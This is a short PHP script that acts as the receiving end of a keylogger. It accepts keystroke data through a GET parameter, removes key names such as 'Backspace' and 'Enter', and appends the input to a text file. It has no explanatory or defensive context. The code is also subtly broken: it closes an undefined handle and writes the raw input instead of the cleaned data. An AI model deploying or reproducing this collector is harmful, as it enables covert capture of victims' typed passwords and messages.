<?php
$iframe="true";
$file = 'data.txt';session_start();
if(isset($_GET['q']) && !empty($_GET['q']))
{$data=$_GET['q'];$remove = array('.Backspace','.Enter','Enter','Backspace','Up Arrow','Down Arrow','.');
$data = str_replace($remove,'',$data);fclose($output);
$data = str_replace(' ','|',$data);
file_put_contents($file, $_GET['q'], FILE_APPEND);
printf("Logged!");}